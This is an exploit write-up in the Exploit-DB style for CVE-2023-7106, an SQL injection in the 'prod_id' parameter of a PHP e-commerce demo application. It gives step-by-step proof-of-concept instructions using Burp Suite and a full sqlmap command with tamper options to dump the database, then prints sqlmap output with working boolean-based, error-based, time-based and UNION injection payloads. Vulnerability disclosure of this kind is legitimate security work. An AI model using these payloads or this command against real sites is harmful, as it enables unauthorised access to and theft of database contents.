# CVE-2023-7106_E-Commerce Website - SQL Injection 2
+ **Exploit Title:** CVE-2023-7106_E-Commerce Website - SQL Injection 2
+ **Date:** 2023-24-12
+ **Exploit Author:** Hamdi Sevben
+ **Vendor Homepage:** https://code-projects.org/e-commerce-website-in-php-with-source-code/
+ **Software Link:** https://download-media.code-projects.org/2020/01/E-COMMERCE_WEBSITE_IN_PHP_WITH_SOURCE_CODE.zip
+ **Version:** 1.0
+ **Tested on:** Windows 10 Pro + PHP 8.1.6, Apache 2.4.53
+ **CVE:** CVE-2023-7106

## References: 
+ **CVE-2023-7106:** https://vuldb.com/?id.249001
+ https://www.cve.org/CVERecord?id=CVE-2023-7106
+ https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-7106

## Description:
E-Commerce Website 1.0 allows SQL Injection via parameter 'prod_id' in "http://localhost/Electricks/Electricks-shop/pages/product_details.php?prod_id=11". Exploiting this issue could allow an attacker to compromise the application, access or modify data,  or exploit latest vulnerabilities in the underlying database.

## Proof of Concept:
+ Go to the ELECTRONIC PRODUCTS: "http://localhost/Electricks/Electricks-shop/pages/products.php"
+ Option and View.
+ Intercept the request via Burp Suite and send to Repeater.
+ Copy and paste the request to a "r.txt" file.
+ Captured Burp request:
```
GET /Electricks/Electricks-shop/pages/product_details.php?prod_id=11 HTTP/1.1
Host: localhost
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: en-us,en;q=0.5
Cache-Control: no-cache
Cookie: PHPSESSID=ph6ngt1khn1l20eg8hivgv8uc6
Referer: http://localhost/Electricks/Electricks-shop/index.php
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36
```

+ Use sqlmap to exploit. In sqlmap, use 'prod_id' parameter to dump the database. 
```
python sqlmap.py -r r.txt -p prod_id --risk 3 --level 5 --threads 1 --random-agent tamper=between,randomcase --proxy="http://127.0.0.1:8080" --dbms mysql --batch --current-db
```

```
---
Parameter: prod_id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: prod_id=11' AND 7251=7251-- mvqJ

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: prod_id=11' AND (SELECT 4336 FROM(SELECT COUNT(*),CONCAT(0x716a787671,(SELECT (ELT(4336=4336,1))),0x71627a7a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- FBBS

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: prod_id=11' AND (SELECT 3355 FROM (SELECT(SLEEP(5)))DonO)-- wPLs

    Type: UNION query
    Title: Generic UNION query (NULL) - 12 columns
    Payload: prod_id=11' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716a787671,0x4477555048486f6e487148784e57436e6b546e534d654447714f6256496243505158646c65797252,0x71627a7a71),NULL,NULL,NULL,NULL,NULL-- -
---
[20:05:42] [INFO] the back-end DBMS is MySQL
web application technology: Apache 2.4.53, PHP 8.1.6
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[20:05:42] [INFO] fetching current database
current database: 'electricks'
```

+ current database: `electricks`
![2](https://github.com/h4md153v63n/CVEs/assets/5091265/ef46e98d-0521-488a-aef2-0ae24dadba49)
